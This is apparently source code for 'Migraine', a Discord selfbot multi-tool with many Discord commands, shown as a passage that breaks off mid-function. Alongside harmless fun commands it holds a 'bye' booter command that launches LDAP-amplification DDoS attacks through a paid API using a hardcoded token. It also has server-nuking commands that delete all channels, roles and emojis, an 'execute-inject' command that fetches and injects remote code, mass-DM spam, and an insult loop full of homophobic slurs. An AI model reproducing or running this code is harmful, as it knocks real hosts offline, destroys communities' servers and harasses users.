using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Figgle;
using Migraine_v2.LoginClass;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using Migraine_v2.CustomSettings;
using System.Text;
using Migraine_v2.API;
using Migraine_v2.DClient;

namespace Migraine_v2.SelfbotClasses {
    public class Commands : ModuleBase
    {

        [Command("dchan")]
        public async Task DeleteChannels()
        {
            await Context.Message.DeleteAsync();
            IReadOnlyCollection<IGuildChannel> get = await Context.Guild.GetChannelsAsync(CacheMode.AllowDownload, null);
            foreach (var channel in get)
                await channel.DeleteAsync();
        }
        [Command("goodbye")]
        public async Task Goodbye()
        {
            await Context.Message.DeleteAsync();
            IReadOnlyCollection<IGuildChannel> get = await Context.Guild.GetChannelsAsync(CacheMode.AllowDownload, null);
            foreach (var channel in get)
                await channel.DeleteAsync();
            var Emojis = Context.Guild.Emotes;
            foreach (var emoji in Emojis)
            {
                await Context.Guild.DeleteEmoteAsync(emoji);
            }
            var roles = Context.Guild.Roles;
            foreach (var role in roles)
            {
                await role.DeleteAsync();
            }
        }
        [Command("ccmds")]
        public async Task CustomCmds()
        {
            await Context.Message.DeleteAsync();

            EmbedBuilder build = new EmbedBuilder();
            build.WithTitle("Custom Commands");
            build.WithDescription("Here's a list of all your custom, user defined, commands");
            build.WithColor(Color.Orange);

            if (Configuration._Config.CustomCommands.Count > 0)
            {
                foreach (var key in Configuration._Config.CustomCommands.Keys)
                {
                    if (Configuration._Config.CustomCommands.TryGetValue(key, out string value))
                    {
                        build.WithFields().AddField(key, value, true);
                    }
                }
            }
            else
            {
                build.WithDescription($"You have no custom commands! You can use the command {Globals.Prefix}ccmd <cmdname> <response> to create one however.");
            }

            await ReplyAsync("", false, build.Build());
        }
        [Command("invisboi")]
        public async Task InvisBoi()
        {
            var success = 0;
            await Context.Message.DeleteAsync();

            for(int i = 0; i < 26; i++)
            {
                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("Authorization", Globals.Token);

                var response = await client.PutAsync("https://canary.discordapp.com/api/v6/users/@me/connections/skype/" + i, new StringContent("{\"friend_sync\":false}", Encoding.UTF8, "application/json"));

                if (response.StatusCode == (HttpStatusCode)200)
                {
                    //https://canary.discordapp.com/api/v6/users/@me/connections/skype
                    response = await client.PatchAsync($"https://canary.discordapp.com/api/v6/users/@me/connections/skype/{i}", new StringContent("{\"visibility\":1}", Encoding.UTF8, "application/json"));

                    if (response.StatusCode == (HttpStatusCode)200)
                    {
                        success++;
                    }
                }
            }

            if (success >= 25)
            {
                ConsoleLog.Log("[Console] Successfully created invisible connections.");
            }
        }
        [Command("ccmd")]
        public async Task CreateCustomCommand(string name, [Remainder] string response)
        {
            await Context.Message.DeleteAsync();

            EmbedBuilder build = new EmbedBuilder();
            build.WithTitle("Custom Commands");
            build.WithDescription("Successfully created your custom command.");
            build.WithColor(Color.Green);
            build.WithAuthor("Success!", "https://i.dlpng.com/static/png/6705921_preview.png");
            Configuration._Config.CustomCommands.Add(Globals.Prefix + name.ToLower(), response);
            Configuration.SaveConfig();

            await ReplyAsync("", false, build.Build());
        }
        [Command("dcmd")]
        public async Task DeleteCustomCommand(string name)
        {
            await Context.Message.DeleteAsync();

            EmbedBuilder build = new EmbedBuilder();
            build.WithTitle("Custom Commands");
            build.WithDescription("Successfully deleted your custom command.");
            build.WithColor(Color.Green);
            Configuration._Config.CustomCommands.Remove(Globals.Prefix + name.ToLower());
            Configuration.SaveConfig();
            build.WithAuthor("Success!", "https://i.dlpng.com/static/png/6705921_preview.png");

            await ReplyAsync("", false, build.Build());
        }
        [Command("loopinsult")]
        public async Task LoopInsult()
        {
            await Context.Message.DeleteAsync();
            var msg = new Random();
            var insults = new string[] {
                "ur a fag",
                "get a life u shitbag",
                "ur mom has balls bigger than you",
                "keep sucking dick faggot",
                "ur a pussy",
                "keep talking fag",
                "i bench ur mom tits in my mouth",
                "ok boomer",
                "u can't talk for shit, did u run out of jokes?",
                "go back to sucking your moms left tit",
                "are you gonna cry now? awwwwww",
                "bitch please, you built like a soggy noodle"
            };
            foreach (var message in insults)
            {
                await Context.Channel.SendMessageAsync($"{insults[msg.Next(0, insults.Length)]}");
                Thread.Sleep(15000);
            }
        }

        [Command("8ball")]
        public async Task ball([Remainder] string message)
        {
            await Context.Message.DeleteAsync();
            var answers = new string[] {
                "It is certain",
                "It is decidedly so",
                "Without a doubt",
                "Yes, definitely",
                "You may rely on it",
                "As I see it, yes",
                "Most likely",
                "Outlook good",
                "Yes",
                "Signs point to yes",
                "Reply hazy try again",
                "Ask again later",
                "Better not tell you now",
                "Cannot predict now",
                "Concentrate and ask again",
                "Don't count on it",
                "My reply is no",
                "My sources say no",
                "Outlook not so good",
                "Very doubtful"
            };

            if (string.IsNullOrWhiteSpace(message))
                return;
            Random rng = new Random();
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithTitle($"Question: **{message}**");
            embed.WithDescription("Answer: `" + answers[rng.Next(0, answers.Length)] + "`");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("in #" + Context.Channel.Name + " - Today at " + DateTime.Now.ToShortTimeString(), null);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("911")]
        public async Task nine11()
        {
            await Context.Message.DeleteAsync();
            var Message = await Context.Channel.SendMessageAsync(":firecracker::airplane:       :office:");
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane:     :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane:    :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane:   :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane:  :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":firecracker::airplane: :office:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":boom:";
            }, null);
            Thread.Sleep(1000);
            await Context.Message.DeleteAsync();
        }

        [Command("anime")]
        public async Task anime()
        {
            await Context.Message.DeleteAsync();

            var client = new WebClient();
            string json = client.DownloadString("https://api.computerfreaker.cf/v1/anime");
            var result = JsonConvert.DeserializeObject<RandomAnime>(json);

            var embed = new EmbedBuilder();
            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("annoy")]
        public async Task annoy(string args)
        {
            await Context.Message.DeleteAsync();
            foreach (var message in args)
            {
                Thread.Sleep(16000);
                await Context.Channel.SendMessageAsync(args);
                await Context.Message.DeleteAsync();
            }
            await Context.Channel.SendMessageAsync(args);
        }

        [Command("ascii")]
        public async Task ascii([Remainder] string args)
        {
            await Context.Message.DeleteAsync();

            await Context.Channel.SendMessageAsync("```" + FiggleFonts.Standard.Render(args) + "```");
        }

        [Command("av")]
        public async Task av([Remainder] SocketUser user)
        {
            if (user == null)
                user = Context.Message.Author as SocketUser;

            List<string> RolesString = new List<string>();
            foreach (var role in Context.Guild.Roles)
                RolesString.Add(role.Mention);

            var embed = new EmbedBuilder();
            await Context.Message.DeleteAsync();
            embed.WithAuthor($"{user}'s Avatar");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithImageUrl(user.GetAvatarUrl(0, 1024));
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("save")]
        public async Task SaveAll()
        {
            await Context.Message.DeleteAsync();
            var getservers = await Context.Client.GetGuildsAsync(CacheMode.AllowDownload);
            bool misc = !Directory.Exists("MISC");
            if (misc)
                Directory.CreateDirectory("MISC");
            string saver = "MISC/Saved Servers/Saved Server-" + DateTime.Now.ToString("hh-mm tt" + "/");
            Directory.CreateDirectory(saver);
            string contents = string.Join("\n", getservers);
            File.AppendAllText(saver + "Saved Servers.txt", contents);
            var embed = new EmbedBuilder();
            embed.WithTitle("Success!");
            embed.WithAuthor(Context.User.Username, Context.User.GetAvatarUrl(ImageFormat.Auto));
            embed.WithDescription($"Successfully saved {getservers.Count.ToString()} servers to text file.");
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("ban")]
        public async Task ban(SocketUser userName = null, [Remainder] string reason = null)
        {
            SocketUser user = Context.User as SocketUser;
            bool flag = userName == null;
            if (flag)
                await Context.Channel.SendMessageAsync("Specify someone to ban.", false, null);
            else if (userName == user)
                await Context.Channel.SendMessageAsync("I'm not banning myself, try someone else.", false);
            try
            {
                await Context.Guild.AddBanAsync(userName, 5, reason);
                await Context.Channel.SendMessageAsync((reason == null) ? ("I Banned " + userName.Username) : ("I Banned " + userName.Username + " Because: " + reason), false, null);
                ConsoleLog.Log("Banned User " + userName.Username + " from " + Context.Guild.Name);
            }
            catch (Exception)
            {
                await Context.Channel.SendMessageAsync("Uhm, Just Kidding...", false, null);
            }
        }


        [Command("price btc")]
        public async Task BitcoinPrice()
        {
            await Context.Message.DeleteAsync();

            var args = new WebClient();
            {
                string price = args.DownloadString("https://bitpay.com/api/rates/usd");
                dynamic json = JsonConvert.DeserializeObject(price);
                var embed = new EmbedBuilder();
                embed.WithAuthor("Bitcoin Price", "https://bitcoin.org/img/icons/opengraph.png", "https://migraine.best/");
                embed.WithDescription("Displays bitcoin price");
                embed.WithColor(new Color(242, 169, 0));
                embed.AddField("Bitcoin Price:", double.Parse(Convert.ToString(json.rate)).ToString("C"));

                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
        }

        [Command("bomb")]
        public async Task Bomb()
        {
            await Context.Message.DeleteAsync();
            var Message = await Context.Channel.SendMessageAsync(":bomb:------:fire:");
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:-----:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:----:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:---:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:--:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":bomb:-:fire:";
            }, null);
            Thread.Sleep(1000);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = ":boom:";
            }, null);
            Thread.Sleep(1000);
            await Context.Message.DeleteAsync();
        }

        public string bitcoin;

        [Command("pay btc")]
        public async Task Bitcoin()
        {
            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();
            Settings.getSettings();
            string bitcoin = Settings._Bitcoin;
            embed.WithAuthor("Bitcoin Address", "https://bitcoin.org/img/icons/opengraph.png", "https://migraine.best/");
            embed.WithDescription("``" + bitcoin + "``");
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        public static JObject json;

        public static string getDefaults()
        {
            List<string> str = new List<string>();
            str.Add("{");
            str.Add("\"userInfo\":{");
            str.Add("\"bitcoin\":\"\"");
            str.Add("}");
            str.Add("}");
            return string.Join("\n", str.ToArray());
        }
        [Command("invisconnections")]
        public async Task InvisC()
        {

        }
        [Command("bye")]
        public async Task Bye(string ip, string port, string time)
        {
            //f (ip = null)
            await Context.Message.DeleteAsync();
            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["token"] = "pDCNT0zYIjpHsR",
                    ["target"] = ip,
                    ["port"] = port,
                    ["duration"] = time.ToString(),
                    ["method"] = "LDAP",
                    ["pps"] = "500000"
                    //["test_id"] = test_id
                };
                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/launch"), new FormUrlEncodedContent(PostData));
            }

            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor("Attack sent successfully. | Migraine Booter");
            //embed.AddField("**ID:**", $"{test_id}");
            embed.AddField("**Target:**", $"{ip}");
            embed.AddField("**Port:**", $"{port}");
            embed.AddField("**Time:**", $"{time}");
            embed.AddField("**Method:**", "LDAP");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("bye stop")]
        public async Task byestop(string test_id)
        {
            await Context.Message.DeleteAsync();
            if (CheckFiddler._())
                return;
            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["token"] = "pDCNT0zYIjpHsR",
                    ["target"] = test_id
                };
                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/stop"), new FormUrlEncodedContent(PostData));
            }

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithAuthor("Attack successfully stopped. | Migraine Booter");
            embed.AddField("**ID:**", $"{test_id}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("bye restart")]
        public async Task byerestart(string test_id)
        {
            await Context.Message.DeleteAsync();
            if (CheckFiddler._())
                return;
            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["token"] = "pDCNT0zYIjpHsR",
                    ["target"] = test_id
                };
                var response = await req.PostAsync(new Uri("https://api.sleek.to/tests/restart"), new FormUrlEncodedContent(PostData));
            }

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithAuthor("Attack sucessfully restarted. | Migraine Booter");
            embed.AddField("**ID:**", $"{test_id}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }

        [Command("cat")]
        public async Task Cat()
        {
            WebClient client = new WebClient();
            string json = client.DownloadString("http://aws.random.cat/meow");
            var result = JsonConvert.DeserializeObject<RandomCatImage>(json);

            var embed = new EmbedBuilder();
            embed.WithImageUrl(result.file.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("clearc")]
        public async Task ClearChat()
        {
            await Context.Message.DeleteAsync();
            await Context.Channel.SendMessageAsync("_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n_ _\n _ _\n _ _\n _ _\n _ _\n");
        }

        [Command("cchan")]
        [RequireUserPermission(GuildPermission.Administrator)]
        public async Task CreateChannels([Remainder] string channelname)
        {
            for (var i = 0; i < 30; i++)
            {
                await Context.Guild.CreateTextChannelAsync(channelname);
                await Context.Guild.CreateVoiceChannelAsync(channelname);
            }
        }

        [Command("developer")]
        public async Task Developer()
        {
            await Context.Message.DeleteAsync();
            var embed = new EmbedBuilder();
            embed.WithAuthor("Migraine - Discord Multi-Tool", Globals.MigraineImageURL);
            embed.WithUrl(Globals.DiscordURL);
            embed.WithDescription($"Migraine is developed by [Twin Turbo]\nTo purchase this tool go to https://migraine.best/");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("dog")]
        public async Task Dog()
        {
            await Context.Message.DeleteAsync();

            WebClient client = new WebClient();
            string json = client.DownloadString("https://random.dog/woof.json");
            var result = JsonConvert.DeserializeObject<RandomDogImage>(json);

            var embed = new EmbedBuilder();
            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("donate")]
        public async Task Donate()
        {
            var embed = new EmbedBuilder();
            await Context.Message.DeleteAsync();
            embed.WithAuthor("Support the Developer", Globals.MigraineImageURL);
            embed.WithDescription(string.Concat("Bitcoin: ``1NXC8dD7udv4Sghf5J4pSeNYmTvgpoiGtG``"));
            embed.WithColor(new Color(255, 153, 0));
            embed.WithFooter("Migraine");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("embed")]
        public async Task Embed([Remainder] string message)
        {
            await Context.Message.DeleteAsync(null);
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor("");
            embed.WithDescription(message);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("in #" + Context.Channel.Name + " - Today at " + DateTime.Now.ToShortTimeString(), null);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("coinflip")]
        public async Task CoinFlip()
        {
            await Context.Message.DeleteAsync();

            Random headsortails = new Random();
            var embed = new EmbedBuilder();

            var result = headsortails.Next(0, 2) == 0 ? "Heads" : "Tails";
            embed.WithDescription(result.ToString());
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("gay")]
        public async Task Gay(SocketGuildUser user)
        {
            if (user == null)
                user = Context.Message.Author as SocketGuildUser;

            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();
            Random random = new Random();

            int randomNumber = random.Next(0, 100);
            embed.WithAuthor("");
            embed.WithTitle("Gay Calculator");
            embed.WithDescription("See's how gay the person is");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithDescription($"**{user}**, You are {randomNumber}% gay.");
            embed.WithFooter("Migraine");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("gp")]
        public async Task GhostPing(SocketUser user) => await Context.Message.DeleteAsync();

        [Command("hack")]
        public async Task Hack(SocketUser user)
        {
            await Context.Message.DeleteAsync();

            var Message = await Context.Channel.SendMessageAsync($"*Hacking {user}...*");
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = string.Format("*Getting {0}'s IP Address...*", user);
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*IP: 192.168.1.1*";
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = string.Format("*Getting {0}'s Address...*", user);
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*Address: 123 Elf dr*";
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*Grabbing all Info...*";
            }, null);
            Thread.Sleep(1500);

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "*Sent to FBI*";
            }, null);
            Thread.Sleep(2500);
            await Context.Message.DeleteAsync();
        }

        [Command("help")]
        public async Task Help()
        {
            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();

            embed.WithTitle("Migraine Selfbot Commands");
            embed.WithDescription("**View all the Commands you can execute below!**");
            embed.AddField("stats", "View selfbot statistics");
            embed.AddField("ping", "Check client's latency");
            embed.AddField("spam", "Spams Channel (spam <message> <amount>)");
            embed.AddField("embed", "Embeds your message");
            embed.AddField("poll", "Creates a Poll");
            embed.AddField("quote", "Quote a Message (quote <messageid>)");
            embed.AddField("cquote", "Copy quote from a different channel (cquote <messageid>)");
            embed.AddField("ban", "Ban a user");
            embed.AddField("kick", "Kick a user");
            embed.AddField("userinfo", "Get information on a user");
            embed.AddField("purge", "Deletes messages (purge <amount>)");
            embed.AddField("massdm", "Dm all Members (Risky On Main Account)");
            embed.AddField("gp", "Makes the person your pinging clueless");
            embed.AddField("clearc", "Clears chat with invisible characters");
            embed.AddField("ascii", "Changes your text to ascii format <message>");
            embed.AddField("bye", "Booter (Usage: bye <ip> <port> <timetoseconds>)");
            embed.AddField("gay", "Gay Calculator <user>");
            embed.AddField("spfp", "Returns Server picture");
            embed.AddField("sstats", "Returns Server statistics");
            embed.AddField("ccmds", "Returns a list of your custom commands");
            embed.AddField("ccmd", "Creates a custom user defined command (ccmd <cmdname> <response>)");
            embed.AddField("dcmd", "Deletes a custom user defined command (dcmd <cmdname>)");
            embed.WithFooter("If you want to see more of Migraine's commands, look inside the program.");
            embed.WithColor(Globals.EmbedHexColor);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("hentai")]

        public async Task Hentai()
        {
            await Context.Message.DeleteAsync();

            WebClient client = new WebClient();
            var embed = new EmbedBuilder();

            string json = client.DownloadString("https://nekos.life/");
            var result = JsonConvert.DeserializeObject<RandomHentai>(json);

            embed.WithImageUrl(result.image.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("hug")]

        public async Task Hug()
        {
            await Context.Message.DeleteAsync();

            WebClient client = new WebClient();
            var embed = new EmbedBuilder();

            string json = client.DownloadString("https://api.computerfreaker.cf/v1/hug");
            var result = JsonConvert.DeserializeObject<RandomHug>(json);

            embed.WithImageUrl(result.url.ToString());
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("invis")]
        public async Task Invis()
        {
            await Context.Message.DeleteAsync();

            string link = "https://cdn.discordapp.com/attachments/685289191768457402/686501603905241111/invis.png";

            var s = Context.Message.DeleteAsync();

            try {
                var webClient = new WebClient();
                byte[] imageBytes = webClient.DownloadData(link);

                var stream = new MemoryStream(imageBytes);
                await Context.Client.CurrentUser.ModifyAsync(x => x.Avatar = new Image(stream));
                var getuser = Context.Client.CurrentUser.Id;
                var final = await Context.Guild.GetUserAsync(getuser);
                await final.ModifyAsync(x => x.Nickname = "ٴٴٴ");
            }
            catch (Exception)
            {
                var embed = new EmbedBuilder();
                embed.WithDescription("Could not set the avatar!");
                embed.WithColor(new Color(255, 0, 0));
                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
        }
        [Command("execute-inject")]
        public async Task Execute(string text)
        {
            Injection inject = new Injection(true, new WebClient().DownloadString(text.ToString()), true);
            ClientInjector injector = new ClientInjector(inject, false);
            injector.Inject();
        }
        [Command("ip")]

        public async Task IP(string ip)
        {
            await Context.Message.DeleteAsync();
            WebClient client = new WebClient();

            var req = new HttpClient();
            {
                var PostData = new Dictionary<string, string>
                {
                    ["ip"] = ip
                };
                var response = await req.PostAsync(new Uri($"https://ipapi.co/{ip}/json/"), new FormUrlEncodedContent(PostData));
                string json = client.DownloadString($"https://ipapi.co/{ip}/json/");
                var result = JsonConvert.DeserializeObject<IPInformation>(json);
            }

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithAuthor("IP Result. | Migraine");
            embed.AddField("**IP:**", $"{ip}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("kick")]
        [RequireUserPermission(GuildPermission.KickMembers)]
        public async Task Kick(SocketGuildUser userName = null, string reason = null)
        {
            SocketGuildUser user = Context.User as SocketGuildUser;
            bool flag = userName == null;
            if (!flag)
            {
                bool flag2 = userName == user;
                if (!flag2)
                {
                    int targetHighest = userName.Hierarchy;
                    int senderHighest = user.Hierarchy;
                    bool flag3 = targetHighest < senderHighest;
                    if (flag3)
                    {
                        try
                        {
                            await userName.KickAsync(null, null);
                            IUserMessage userMessage = await this.ReplyAsync((reason == null) ? ("I Have Kicked " + userName.Username) : ("I Have Kicked " + userName.Username + " Because: " + reason), false, null, null);
                            ConsoleLog.Log("Kicked User " + userName.Username + " from " + user.Guild.Name);
                        }
                        catch
                        {
                        }
                    }
                    else
                    {
                        await this.ReplyAsync("Uhm, Just Kidding...", false, null, null);
                    }
                }
            }
        }

        [Command("lenny")]
        public async Task Lenny()
        {
            await Context.Message.DeleteAsync();
            await Context.Channel.SendMessageAsync("( ͡° ͜ʖ ͡°)");
        }

        [Command("massdm")]
        public async Task MassDM(/*[Remainder] */string message)
        {
            await Context.Message.DeleteAsync(null);
            if (message == null)
            {
                await this.ReplyAsync("Need message to send", false, null, null);
            }
            else
            {
                ConsoleLog.Log("Started Mass Dming");
                new Thread(delegate ()
                {
                    this.DmSpam(message);
                }).Start();
            }
        }
        public async Task DmSpam(string message)
        {
            IReadOnlyCollection<IGuildUser> readOnlyCollection = await Context.Guild.GetUsersAsync(CacheMode.AllowDownload, null);
            IReadOnlyCollection<IGuildUser> users = readOnlyCollection;
            readOnlyCollection = null;
            foreach (IGuildUser user in users)
            {
                int num = 0;
                try
                {
                    IDMChannel idmchannel = await user.GetOrCreateDMChannelAsync(null);
                    IDMChannel channel = idmchannel;
                    idmchannel = null;
                    await channel.SendMessageAsync(message, false, null, null);
                    await Task.Delay(100);
                    channel = null;
                }
                catch
                {
                    num = 1;
                }
                if (num == 1)
                {
                    await Task.Delay(1000);
                }
            }
            ConsoleLog.Log("Finished Mass Dming");
        }

        [Command("migraine")]
        public async Task Migraine()
        {
            await Context.Message.DeleteAsync();

            var Message = await Context.Channel.SendMessageAsync("M");

            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MI";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIG";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGR";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRA";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAI";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAIN";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE |";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE ";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE |";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE ";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE |";
            }, null);
            Thread.Sleep(500);
            await Message.ModifyAsync(delegate (MessageProperties msg)
            {
                msg.Content = "MIGRAINE ";
            }, null);
            Thread.Sleep(1000);

            await Context.Message.DeleteAsync();
        }

        [Command("ping")]
        public async Task ping()
        {
            await Context.Message.DeleteAsync();

            var embed = new EmbedBuilder();
            embed.WithAuthor("Pong!", "http://pngimg.com/uploads/ping_pong/ping_pong_PNG10375.png");
            embed.WithDescription(string.Concat("**Socket Latency**: ", StartBot._Client.Latency.ToString("#,##0"), "ms"));
            embed.WithFooter("Migraine");
            embed.WithColor(Globals.EmbedHexColor);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
            Thread.Sleep(1000);
            await Context.Message.DeleteAsync();
        }

        [Command("poll")]
        public async Task poll([Remainder] string message)
        {
            await Context.Message.DeleteAsync();
            if (message == null) {
                await Context.Channel.SendMessageAsync("Please enter a message.");
            }
            var check = new Emoji("✅");
            var exit = new Emoji("❌");
            EmbedBuilder embed = new EmbedBuilder();
            embed.Title = "Vote!";
            embed.WithThumbnailUrl(Context.Client.CurrentUser.GetAvatarUrl(0));
            embed.WithDescription($"```{message}```");
            embed.WithColor(Globals.EmbedHexColor);
            IUserMessage userMessage2 = await Context.Channel.SendMessageAsync("", false, embed.Build(), null);
            IUserMessage userMessage = userMessage2;
            userMessage2 = null;
            IUserMessage msg = userMessage;
            await msg.AddReactionAsync(check, null);
            await msg.AddReactionAsync(exit, null);
        }

        [Command("purge")]
        public async Task purge(int amount)
        {
            await Context.Message.DeleteAsync();
            var messages = Context.Channel.GetMessagesAsync(amount);
            var enumerator = messages.GetAsyncEnumerator();
            while (enumerator.MoveNextAsync().Result)
            {
                foreach (var message in enumerator.Current)
                {
                    if (message.Author.Mention == StartBot._Client.CurrentUser.Mention && message.Source == MessageSource.User)
                    {
                        await message.DeleteAsync();
                    }
                }
            }
        }

        [Command("quote")]
        public async Task quote(string msg)
        {
            bool flag = msg == null;
            if (flag)
            {
                bool flag2 = Commands.author == null;
                if (flag2)
                {
                    await this.ReplyAsync("You must copy a quote or include a message id!", false, null, null);
                }
                else
                {
                    await Context.Message.DeleteAsync();
                    EmbedBuilder embed = new EmbedBuilder();
                    embed.WithAuthor(Commands.author, null, null);
                    embed.WithDescription(Commands.Content);
                    embed.WithColor(Globals.EmbedHexColor);
                    embed.WithFooter("in #" + Commands.Channel + " - " + Commands.Time, null);
                    await Context.Channel.SendMessageAsync("", false, embed.Build(), null);
                }
            }
            else
            {
                ulong id = Convert.ToUInt64(msg);
                await Context.Message.DeleteAsync();
                IEnumerable<IMessage> enumerable = await Context.Channel.GetMessagesAsync(100, CacheMode.AllowDownload, null).FlattenAsync<IMessage>();
                IEnumerable<IMessage> messages = enumerable;
                foreach (IMessage message in messages)
                {
                    if (message.Id.ToString().Contains(id.ToString()))
                    {
                        EmbedBuilder embed2 = new EmbedBuilder();
                        embed2.WithAuthor(message.Author);
                        embed2.WithDescription(message.Content);
                        embed2.WithColor(Globals.EmbedHexColor);
                        embed2.WithFooter("in " + Context.Channel.Name + " - " + message.Timestamp.LocalDateTime.ToShortDateString(), null);
